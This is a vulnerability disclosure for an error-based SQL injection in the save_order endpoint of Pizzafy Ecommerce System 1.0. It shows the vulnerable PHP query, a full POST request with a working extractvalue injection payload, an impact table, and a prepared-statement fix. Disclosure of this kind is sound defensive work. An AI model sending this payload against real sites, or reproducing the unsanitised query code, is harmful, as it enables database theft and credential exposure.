
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizzafy/admin/ajax.php?action=save_order`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **SELECT functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `user_id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
public function save_order() {
    if(!isset($_SESSION['login_user_id'])) {
        return "0";
    }
    
    extract($_POST);
    $user_id = $_SESSION['login_user_id'];
    $name = $first_name . ' ' . $last_name;

    if (empty($id)) {
        $id = $_SESSION['login_user_id'];
    }
    
    $cart_items = $this->conn->query("SELECT c.*, p.price, p.name 
                                       FROM cart c 
                                       JOIN product_list p ON c.product_id = p.id 
                                       WHERE c.user_id = $id OR c.user_id = '$user_id");

    if (!$cart_items) {
        return $this->conn->error;
    }                                      
    
    if($cart_items->num_rows == 0) {
        return "0";
    }
    ...
```

Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  

```
POST /pizzafy/admin/ajax.php?action=save_order HTTP/1.1
Host: localhost
Content-Length: 83
sec-ch-ua: 
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/checkout.php
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
Connection: close

first_name=test&last_name=test&email=test%40gmail.com'&mobile=156156&address=15615&id=-8 OR extractvalue(1,concat(0x7e,database())) --
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
id=-8 OR extractvalue(1,concat(0x7e,database())) --
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/1pA3PYV.png)
---

## Remediation
```php

$stmt = $this->conn->prepare("SELECT c.*, p.price, p.name 
                              FROM cart c 
                              JOIN product_list p ON c.product_id = p.id 
                              WHERE c.user_id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$cart_items = $stmt->get_result();

if (!$cart_items) {
    error_log("Erro no carrinho: " . $this->conn->error);
    return "0";
}                                      
    
if($cart_items->num_rows == 0) {
    return "0";
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `id` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
